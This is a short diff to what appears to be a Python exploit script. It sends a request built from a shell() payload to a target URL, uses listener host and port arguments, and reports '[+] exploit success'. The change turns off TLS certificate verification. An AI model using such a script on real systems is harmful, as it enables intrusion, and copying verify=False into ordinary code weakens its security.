@@ -71,7 +71,7 @@ if __name__ == "__main__":
             target = args.url
             ip = args.lhost
             port = args.lport
-            e = requests.get(target + shell())
+            e = requests.get(target + shell(), verify=False)
             if e.status_code == 200 or e.status_code == 302:
                     print("[+] exploit success")
             else:
